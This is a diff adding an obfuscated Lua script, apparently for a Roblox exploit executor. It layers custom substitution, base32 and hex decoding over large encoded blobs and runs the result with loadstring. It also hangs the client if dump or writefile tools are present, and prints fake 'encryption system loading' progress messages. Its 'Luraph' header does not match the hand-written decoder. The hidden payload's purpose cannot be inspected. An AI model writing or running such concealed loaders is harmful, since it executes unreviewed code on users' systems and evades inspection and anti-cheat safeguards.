@@ -1,0 +1,91 @@
+-- This file was protected using Luraph Obfuscator v14.7 [https://lura.ph/]
+coroutine.wrap(function()
+local endTime = tick() + 20
+local switch = false
+while tick() < endTime do
+if switch then print(string.char(82,79,66,229,138,160,229,175,134,230,163,128,230,181,139,229,136,176,100,117,109,112,229,188,128,230,186,144,46,46,46)) else warn(string.char(82,79,66,229,138,160,229,175,134,230,163,128,230,181,139,229,136,176,100,117,109,112,229,188,128,230,186,144,46,46,46)) end
+switch = not switch
+task.wait(0.05)
+end
+end)()
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,49,48,37))
+local _L = loadstring or function(c) return load(c) end
+if _G[string.char(119,114,105,116,101,102,105,108,101)] ~= nil or _G[string.char(100,117,109,112)] ~= nil then while true do end end
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,50,48,37))
+__ROBKEY = "WcGuAr2QhF5BqSqVdBSiLOIommIi3gx5"
+local _Xkdn7t=73823
+local _Jzo25aag1 = 5238
+local _Jg3w4z2b9 = 20731
+local _Jgu4gq3tm = 55081
+local function _JNK_9x7kb6(p) local _t={} for _i=1,#p do _t[_i]=string.char(p:byte(_i)+1) end return table.concat(_t) end
+local function _B32D(s)
+local a="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" local bits="" for i=1,#s do local c=s:sub(i,i) local p=string.find(a,c,1,true) if p then local v=p-1 local b="" for j=4,0,-1 do if v>=2^j then b=b.."1" v=v-2^j else b=b.."0" end end bits=bits..b end end
+local bytes={} for i=1,#bits,8 do local bs=bits:sub(i,i+7) if #bs==8 then local byte=0 for k=1,8 do byte=byte*2+tonumber(bs:sub(k,k)) end bytes[#bytes+1]=byte end end
+local r="" for i=1,#bytes do r=r..string.char(bytes[i]) end return r end
+local function _SHFL(orig,seed) local t={} for i=1,#orig do t[i]=orig:sub(i,i) end local function _RAND() seed=(1664525*seed+1013904223)%4294967296 return seed end for i=#t,2,-1 do local j=math.floor(_RAND()%i)+1 t[i],t[j]=t[j],t[i] end local r="" for i=1,#t do r=r..t[i] end return r end
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,51,48,37))
+local _SO="0123456789abcdef"
+local _SM=_SHFL(_SO,647859666)
+local _SMHEX="aea2f3faafabfdffaeff77aaa9a9a8fdaba6f8aeaefdaaa6abfd76a6a5f3f8fea5a67af4aef278fead7ffeaaa9ffaaf6aea37aaea57ea7a8a3ada8ffa3f8a5aea37fafaff7f7f7a0adf8aeff7afa78f2a5a6ada6aef6a7f6a5fda0f6f2fea578aea3fdfaa3a1adfeae7f76aeae7f77afa17afdaeafab78afa1a8f7fffe7afaa0a5a8faa6a3fd77adaba6fdfeffa1a5faa9fda2fff2fea7aea5fd7affaefef2" local _MAPHEX="" for i=1,#_SMHEX do local c=_SMHEX:sub(i,i) local p=string.find(_SM,c,1,true) if p then _MAPHEX=_MAPHEX.._SO:sub(p,p) else _MAPHEX=_MAPHEX..c end end
+local _MAPSTR="" for i=1,#_MAPHEX,2 do local b=tonumber(_MAPHEX:sub(i,i+1),16) if b then _MAPSTR=_MAPSTR..string.char(b) end end
+_MAPSTR=_B32D(_MAPSTR) local _P1=string.find(_MAPSTR,"|",1,true) local _HO=_MAPSTR:sub(1,_P1-1) local _TMP=_MAPSTR:sub(_P1+1)
+local _P2=string.find(_TMP,"|",1,true) local _HM=_TMP:sub(1,_P2-1) local _TMP2=_TMP:sub(_P2+1)
+local _P3=string.find(_TMP2,"|",1,true) local _BO=_TMP2:sub(1,_P3-1) local _BM=_TMP2:sub(_P3+1)
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,52,48,37))
+local _MHEX="ClCC6U6Oseses6yey6yPyssl6UCeV66U66666l6UV8Q26U66sVCQyVVsybV6Q6sbCOyCQsy6VbsQVbsCCyy6sQClyuyeylCeC2C2ylClQQCVVOQs666UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7ClCC6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQbQl6uQbQbQy6uQbQUQs6uQbQbQC6uQbQUQb6uQbQUQ66uQbQUQs6uQbQUQO6uQbQUQb6ls26UV8Q26UC8ClCu6UCeV66UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQU6uQbQbQV6uQbQUQl6uQbQbQ66ls26UV8Q26UC8ClCu6UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7ClCC6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQy6uQbQbQb6uQbQbQb6uQbQUQV6uQbQUQ66uQbQbQV6uQbQbQU6uQlQl6uQbQbQC6uQbQUQs6uQbQbQb6uQbQbQU6ls26UV8Q26UC8ClCu6UCeV66UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQbQU6uQbQUQb6uQbQbQl6uQlQl6uQlQl6uQbQUQO6uQbQbQb6uQbQbQs6uQbQbQV6uQbQbQy6uQbQUQb6ls26UV8Q26UC8ClCu6UCeV66UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQQ6uQbQUQb6uQbQbQC6uQbQbQy6uQlQV6uQbQbQl6uQbQUQl6uQbQUQb6uQbQbQC6uQlQV6uQbQbQC6uQlQV6uQlQO6uQbQUQO6uQbQUQb6ls26UV8Q26UC8ClCu6UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7ClCC6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQbQs6uQbQ6Qb6uQbQbQU6uQlQV6uQbQbQ66uQbQbQs6uQbQUQb6ls26UV8Q26UC8ClCu6UCeV66UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQV6uQbQbQy6uQbQbQU6uQbQUQO6ls26UV8Q26UC8ClCu6UCeV66UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQbQs6uQbQUQb6uQbQbQU6uQbQbQC6uQbQUQs6uQbQbQU6uQbQUQb6uQbQUQO6ls26UV8Q26UC8ClCu6UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7ClCC6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQU6uQbQUQb6uQlQO6uQbQbQV6uQbQUQQ6ls26UV8Q26UC8ClCu6UCbC8Cy6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQbQUQU6uQbQUQb6uQlQO6uQbQbQV6uQbQUQQ6ls2sPVQVyV6ClC8CV68CQCOCbV66OQbQUQQ6uQbQUQb6uQbQbQC6uQbQUQs6uQbQbQU6uQbQUQ66uQbQbQb6ls26UV8Q26UC8ClCu6UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7ClCC6UseyVsPVQVyV6ClC8CV68CQCOCbV66OQ6QQQU6uQbQQQV6uQbQCQV6uQ6QQQ66uQbQCQb6uQbQyQU6ls26UV8Q26UC8ClCu6UVyCOCsC86UVVCOClCuCs6UVyV6VsCs6UCyCe6UCsC8Cy6UCsC8CyU7CuCeCQCbCu6UVUCuCbVlCsV66UQ26UCVCbC2CsQ7yVCsVysQCsV6VCClCQCs6O66sUCuCbVlCsV6VQ666l68yuCeCQCbCusUCuCbVlCsV6U7CuCeCQCbCu6UVUCuCbVlCsV6yVVsCl6UQ26UVUCuCbVlCsV6Q7sVCbClVyyCCeV6yQCOClCuCy6O66sUCuCbVlCsV6yVVsCl666lU7U7CuCeCQCbCu6UCVVsCl6UQ26UylC8VQVyCbC8CQCs68C8CsVV6O66sQCQV6CsCsC8yVVsCl666lU7CVVsCl68y8CbC2Cs6UQ26U66sbVsClCQCPsQCOCeCeVyssyl66U7CVVsCl68s6CsVQCsVyyeC8sQVUCbVVC86UQ26UCCCbCuVQCsU7CVVsCl68sUCbV6CsC8Vy6UQ26UVUCuCbVlCsV6yVVsClU7U7CuCeCQCbCu6UCQCeC8VyCbClC8CsV66UQ26UylC8VQVyCbC8CQCs68C8CsVV6O66yCV6CbC2Cs666lU7CQCeC8VyCbClC8CsV668sQClV7Cs6UQ26UssyyClC2Q668C8CsVV6OQU6u6UQbQ6QU6u6UQU6u6UQCQU6lU7CQCeC8VyCbClC8CsV668sUCeVQClVyClCeC86UQ26UssyyClC2Q668C8CsVV6OQU6u6UQbQU6u6UQU6u6UQbQU6lU7CQCeC8VyCbClC8CsV668y6CbCQCPCVV6CeVsC8CyyQCeCuCeV6QQ6UQ26UyQCeCuCeV6QQ68CCV6CeC2s6yVy66OQQQs6u6UQQQs6u6UQQQs6lU7CQCeC8VyCbClC8CsV668y6CbCQCPCVV6CeVsC8CysyV6CbC8VQVUCbV6CsC8CQVl6UQ26UQU68Q6U7CQCeC8VyCbClC8CsV668y6CeV6CyCsV6sQClV7CssUClVOCsCu6UQ26UQbU7CQCeC8VyCbClC8CsV668y6CeV6CyCsV6yQCeCuCeV6QQ6UQ26UyQCeCuCeV6QQ68CCV6CeC2s6yVy66OQOQU6u6UQOQU6u6UQOQU6lU7CQCeC8VyCbClC8CsV668sUCbV6CsC8Vy6UQ26UCVVsClU7U7CuCeCQCbCu6UC6VsVyVyCeC86UQ26UylC8VQVyCbC8CQCs68C8CsVV6O66syCsVOVyy6VsVyVyCeC8666lU7C6VsVyVyCeC868sQClV7Cs6UQ26UssyyClC2Q668C8CsVV6OQU6u6UQlQU6u6UQU6u6UQyQU6lU7C6VsVyVyCeC868sUCeVQClVyClCeC86UQ26UssyyClC2Q668C8CsVV6OQU68Qs6u6U62QyQs6u6UQU68Qs6u6U62Q6QU6lU7C6VsVyVyCeC868y6CbCQCPCVV6CeVsC8CyyQCeCuCeV6QQ6UQ26UyQCeCuCeV6QQ68C8CsVV6OQb6u6UQb6u6UQb6lU7C6VsVyVyCeC868y6CbCQCPCVV6CeVsC8CysyV6CbC8VQVUCbV6CsC8CQVl6UQ26UQU68QbQsU7C6VsVyVyCeC868syCsVOVy6UQ26U668COl7V8O" local _HEX="" for i=1,#_MHEX do local c=_MHEX:sub(i,i) local p=string.find(_HM,c,1,true) if p then _HEX=_HEX.._HO:sub(p,p) else _HEX=_HEX..c end end
+local _CODE1="" for i=1,#_HEX,2 do local b=tonumber(_HEX:sub(i,i+1),16) if b then _CODE1=_CODE1..string.char(b) end end
+local _MB32="j33d2dsdf5XDhFFfbHo3CFsj2cCacirff5SaVisTPHXdVjFTf5H33HKskbvD3dsdf5XDhFFfbHK3KCojKPjvjHecDjgodPgKkeXvhyoTPAvbhHrAfiwSCFoTfhHacTechPvSAFFa3kv3VHrvbcAdAhwgbggocKhKkeXvhyoTPAv22FFakiav2jFeTea5cXrAk5SdcTec32b32yrjfivSVragkbH3KFsj2cCacAFTPHX3dXrfk5Hcjdsdf5XDhFFfbHcS3yoefHgvhHr2DewSCFsfk5ivhKo3f5v33yoePyvdgKhK2cgdchokPyiSdFwckbH3fVHcDjgDShdF3bfacTec32gDXdic2cgdcHFwP5asjiFbfieSKVsSPbiSKKwdKeavcFoekPgvhHr2KPX3CVswkyaa2KefKwgS3XFwkyav3rarPHjvhrask5HDkXrok5HaVgFTPHXD2FFkKPav2ysekPaaVjabbHeSgFFTfgy2kXrak5eSKVsSk5HdgyrffwgS3XHhkbH3fVHeb2b3KFs2b2bcjFoTkPgSAhd5fPav2arffwXvhjFbfeF3aAFb2cCacHFwP5asjiFbfieSKVsSPbiSKKwdK5HSKVaePHADKydsk5HDkXrokjidadskPyiSdFwckiH3dHFDPbv3fhwy2ws3dFoskjb3AFFokbSdcHoakbs53yowfeXdcTecPHjSAdskPyiSdFwcfPX3dVsjKwvv3hwy2wv3aFcKweiSCFsjkbjSVHrabH2SVVo5fiw3KHFwPAy23FFfPHaS3ywhkHXSVAFjPbvSVKoePHADKywewhgdchwcPbsdcXrffwXvhra5fPav2arffwXvh5oHfwaacTey2wdSVyrPbHKv3HraebvDcyrjKiVvcHefKivvKAFh2wvv2hoePHADKywfK5HSKVaePHADKydjTbA3KhwyDjg2KFs5PjvbKVFbfe2SVVo5fiKDaVobbH3SCyrsk5wDKyojPyvodhojPwaSVdic2cgdchwc2cg3AFFokbSdcAsjPHh3CVHcDjg32yrjfivSVrawkeHSCFo5fia5cFFsPbX3aFFfwhgdchwc2cgdchokPyiSdFwckeX3VjFeTeaacTeckeXvhyoTPAv2dAssPySDKyobKPjvjHhK2cgdchwc2cgdcFoTkPgSAhogPyHacTecPbvDcyrjbHh3CVFefijSCFgK2cgdchwc2cgdcXr32wA3CVHfrcgoVTeckeX3VjoTfkvbghowPHadcVoTfkvbghwVDjg32yofKwvv3raA2c5acAsjPHeSaCsbbHkdcArfkggDcFFsbHkacTiy2wiDhFagPyHaVSeckbv3hhogPyHaVSecDgCacAsjPHh3CVHfr2gdShodfivb3XrXkjvbahojPwaSVdic2cgdchwc2cgdchwc2wH3Kyo5fevcjhwc2cgdchwc2waSVHcK2cgdchwc2cgdcHoakbsSfXrfkVgoXhojfeXSKdic2cgdchwc2cg3hVswkyevhArafggoXhoePHADKywfKwvv3XrjPbvSVdic2cgdchwc2cgD3yowfeXbcFFs2cCacAFTPHX3dXrfk5HdVjoTfPjvhXrTPAbdchwc2waSVHcKk5v3hKhKweKv3HraebvDcyrjKPav2ysekPaaVarffwXvhgFhkbv3fHr2DewSCFsfk5ivhKo3f5v33yoePyvdgXrffwXvhKhK2cgdchoekAg3hVswkysSaFsD2wgSVHwcbwjSVVo5fgvbKVFbfe2SVVo5fiKDaVob2cCsXhdbPHXSXra5fPav2arffwXvh5oHfwaaV5oTf5iSghoTfhg3aFsgf5XdV5rsk5H2aFsgf5XbhCrgkjgoXTech5vDKFefK5HSKVaePHADKydjTbA3KraPPyXv3HKPPyF3KFrbPHXdahojPwaSVdic2cgdchwc2cg3AFFokbSdcHobPiX3dhwy2wjSVVo5fgvbcFFsPbX3aFFf2cSacHoakbs53yowfeXcjhwc2cgdchwc2wiSCFsjkbjSVHrabHh3CVFefijSCFicDjgbKioePjHdVFsbfVjcjhwc2cgdchwc2cgdchwcfPX3dVsjKwvv3raAbHeS3ArkkjScjhwc2cgdchwc2cgdchwcfPX3dVsjKwvv3raAbHDSkHssk5XdcKHckiaSAyowbHkdAdic2cgdchwc2cgdchwc2wHvhArafih3CVHfr2vb3AFwPiaaAdic2cgdchwc2cgdchwc2wHvhArafih3CVHfr2v2CHs3fPavhhwr2wa3KFojk2vbadic2cgdchwc2cgdadic2cgdcHrfkgb3KFs2b2bcj5rsk5H2aFsgf5Xb3HrafHjS3HefebvDcyrjh5v3hHr2DewSCFsfk5ivhKo3f5v33yoePyvdgXrffwXvhKhK2cgdchoekAg3aFsgf5XdV5rsk5H2aFsgf5XbhCrgkjgoXTech5vDKFefK5HSKVaePHADKydjTbA3KrajPyXS3XwcPyHdcXrffwXvhra5fPav2arffwXvh5oHfwaacTey2wdSVyrPbHKv3HraebvDcyrjKiVvcHefe5vvKVFbheXvhyoTPAAacyohk5vcjhwc2cgdchwc2waD2ArDkyjSVHHcDjg3kArkfPagjhwc2cg3KFs2weaSVHwe" local _B32P="" for i=1,#_MB32 do local c=_MB32:sub(i,i) local p=string.find(_BM,c,1,true) if p then _B32P=_B32P.._BO:sub(p,p) else _B32P=_B32P..c end end
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,53,48,37))
+local _CODE2=_B32D(_B32P) local _FINAL=_CODE1.._CODE2 local _HEXCODE="" for i=1,#_FINAL do _HEXCODE=_HEXCODE..string.format("%02x",string.byte(_FINAL,i)) end _FINAL=nil _CODE1=nil _CODE2=nil
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,54,48,37))
+local _MAP_ORIG="0123456789abcdef" local _MAP_MAPPED="3cd9b85f04127ae6" local _MASKED="" for i=1,#_HEXCODE do local c=_HEXCODE:sub(i,i) local p=string.find(_MAP_ORIG,c,1,true) _MASKED=_MASKED.._MAP_MAPPED:sub(p,p) end
+_HEXCODE=nil local _HEXCODE="" for i=1,#_MASKED do local c=_MASKED:sub(i,i) local p=string.find(_MAP_MAPPED,c,1,true) _HEXCODE=_HEXCODE.._MAP_ORIG:sub(p,p) end _MASKED=nil _MAP_ORIG=nil _MAP_MAPPED=nil
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,55,48,37))
+local _DEC="" for i=1,#_HEXCODE,2 do _DEC=_DEC..string.char(tonumber(_HEXCODE:sub(i,i+1),16)) end _HEXCODE=nil
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,56,48,37))
+local _GARBAGE_mfi8z = 2809
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,57,48,37))
+local _F=_L(_DEC) _DEC=nil _L=nil if _F then _F() end __ROBKEY=nil
+print(string.char(82,79,66,229,173,151,231,172,166,228,184,178,229,138,160,229,175,134,231,179,187,231,187,159,229,138,160,232,189,189,228,184,173,46,46,46,49,48,48,37))
+local _Z1s4h1=23921
+local gui=Instance.new("ScreenGui") gui.Parent=game:GetService("CoreGui") gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling gui.Name=math.random(100000,999999)
+local frame=Instance.new("Frame") frame.Size=UDim2.new(0,1,0,1) frame.Position=UDim2.new(0,2,0,2) frame.BackgroundTransparency=0 frame.Parent=gui
+local colors={Color3.new(0,1,0),Color3.new(0.4,1,0.4),Color3.new(0,0.8,1),Color3.new(1,0,0),Color3.new(0.7,0,0)}
+for i=1,5 do frame.BackgroundColor3=colors[i] frame.BackgroundTransparency=(i-1)*0.15 task.wait(0.03) end gui:Destroy()
+local _Ach3ik=48215
+local function _FB32D(s) local a="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" local bits="" for i=1,#s do local c=s:sub(i,i) local p=string.find(a,c,1,true) if p then local v=p-1 local b="" for j=4,0,-1 do if v>=2^j then b=b.."1" v=v-2^j else b=b.."0" end end bits=bits..b end end local bytes={} for i=1,#bits,8 do local bs=bits:sub(i,i+7) if #bs==8 then local byte=0 for k=1,8 do byte=byte*2+tonumber(bs:sub(k,k)) end bytes[#bytes+1]=byte end end local r="" for i=1,#bytes do r=r..string.char(bytes[i]) end return r end
+local _FSB32="GAYTEMZUGU3DOOBZMFRGGZDFMZPTINRQGVSWIOLGGIYWCY3CGM4DO"
+local _FSSTR=_FB32D(_FSB32)
+local _FSEP=string.find(_FSSTR,"_",1,true)
+local _FSO=_FSSTR:sub(1,_FSEP-1)
+local _FSM=_FSSTR:sub(_FSEP+1)
+local _FSMHEX="efe6d1deede3daddefdd55eee7e7e0dae3e9d0efefdaeee9e3da59e9efdaecd0e1eddadfd1e8d5ece3e8d9e2ed5d55dee1d0ebeed6"
+local _FMAPHEX="" for i=1,#_FSMHEX do local c=_FSMHEX:sub(i,i) local p=string.find(_FSM,c,1,true) if p then _FMAPHEX=_FMAPHEX.._FSO:sub(p,p) else _FMAPHEX=_FMAPHEX..c end end
+local _FMAPSTR="" for i=1,#_FMAPHEX,2 do local b=tonumber(_FMAPHEX:sub(i,i+1),16) if b then _FMAPSTR=_FMAPSTR..string.char(b) end end
+_FMAPSTR=_FB32D(_FMAPSTR)
+local _FP1=string.find(_FMAPSTR,"|",1,true)
+local _FO=_FMAPSTR:sub(1,_FP1-1)
+local _FM=_FMAPSTR:sub(_FP1+1)
+local _FMHEX="8e6wjDA8sjjAQVr6AwAelVDw3VDSSleJlceSjwAlA8V3AlVrA3rw3AQQcs3s6D8ws3JA3QDVjeejl68cweV36c3rwDrQs8SrsDssresrVDj3SeDQVQDllrsQrjAcw8lJA6s368lQAVJQwJDeSeVescQsrJe38esD3srS6sQ8DVA8DsAr6QSrrc683ADQAcJws6QwrAQjAjwcJA3DJ883D883sjJDjQASe8jSerwD8esDJreSJDDJJ86j86s6lJ6elsccsVJJsw3DwcQe8A88sls3AclwwjSVwrwlScSQ3S6rlw6c8VwJsS8S8QDwSr6w8DDjlwll6Dj663AwjAlJcDQjSQ63QAQele33A66jVeSwcQAc6rDJ66r68wjQAcQVsw6l3wrJJ8"
+local _FHEX="" for i=1,#_FMHEX do local c=_FMHEX:sub(i,i) local p=string.find(_FM,c,1,true) if p then _FHEX=_FHEX.._FO:sub(p,p) else _FHEX=_FHEX..c end end
+local _FCODE="" for i=1,#_FHEX,2 do local b=tonumber(_FHEX:sub(i,i+1),16) if b then _FCODE=_FCODE..string.char(b) end end
+local _FDUMP=_FCODE
+local _FZzeb5d=16792
+local _Bxj5h8=53430
+local function _TB32D(s) local a="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" local bits="" for i=1,#s do local c=s:sub(i,i) local p=string.find(a,c,1,true) if p then local v=p-1 local b="" for j=4,0,-1 do if v>=2^j then b=b.."1" v=v-2^j else b=b.."0" end end bits=bits..b end end local bytes={} for i=1,#bits,8 do local bs=bits:sub(i,i+7) if #bs==8 then local byte=0 for k=1,8 do byte=byte*2+tonumber(bs:sub(k,k)) end bytes[#bytes+1]=byte end end local r="" for i=1,#bytes do r=r..string.char(bytes[i]) end return r end
+local _TSB32="GAYTEMZUGU3DOOBZMFRGGZDFMZPTAYZUHFSGEMTGME3TMNJYGNSTC"
+local _TSSTR=_TB32D(_TSB32)
+local _TSEP=string.find(_TSSTR,"_",1,true)
+local _TSO=_TSSTR:sub(1,_TSEP-1)
+local _TSM=_TSSTR:sub(_TSEP+1)
+local _TSMHEX="dcd4d9dddbd2dfdad7d6d5d8d3ded1b0bcb4b9bdbbb2bfbab7b694999d9b929ff8f8bddbde9cfa2229d42c9b9294bfd2bcff979ff6d7b69ad12db9b790d6f2b027f0"
+local _TMAPHEX="" for i=1,#_TSMHEX do local c=_TSMHEX:sub(i,i) local p=string.find(_TSM,c,1,true) if p then _TMAPHEX=_TMAPHEX.._TSO:sub(p,p) else _TMAPHEX=_TMAPHEX..c end end
+local _TMAPSTR="" for i=1,#_TMAPHEX,2 do local b=tonumber(_TMAPHEX:sub(i,i+1),16) if b then _TMAPSTR=_TMAPSTR..string.char(b) end end
+local _TP1=string.find(_TMAPSTR,"||",1,true)
+local _TO=_TMAPSTR:sub(1,_TP1-1)
+local _TM=_TMAPSTR:sub(_TP1+2)
+local _TMB32="1Z1W1TaOQwNBa9TJFYINFEYJ01Yzcf7Nwifw7xFviiYIpFJFWFIpzPYa5IBB6xOwa7Pa9iaxJfO95wxNFvE7xSaETpQ1NfpxS97E7xx8dc52BOQiivZWd5zpTiOY8aP2zdJYNN18EiTBz0d0EFTPwdz2IBEiNTffwIcPPIafxS9Y85QPSF5cZ5z58zpzPWT1wzTB21E1ScpzF6fi1BIBxTx0E9B56pavzIziv520QQJai8Oa7QNZdSzQpBa1W5dxv55Of2diciPa26598TNWzcpYW6Y82aBOiTwYS11PNZTOZ8SI5Z6I0vf8Sv8aSZ69OOi9Qf5OcZSIWI9xcOv1WW7T90B2ZSzT56I61f0WEIF2ZBv71QY8N0SOEv5EYcWpcI8zQNTfBPvSO"
+local _TB32P="" for i=1,#_TMB32 do local c=_TMB32:sub(i,i) local p=string.find(_TM,c,1,true) if p then _TB32P=_TB32P.._TO:sub(p,p) else _TB32P=_TB32P..c end end
+local _TCODE=_TB32D(_TB32P)
+local _TDROP=_TCODE
+local _TZ7dfkb=29638
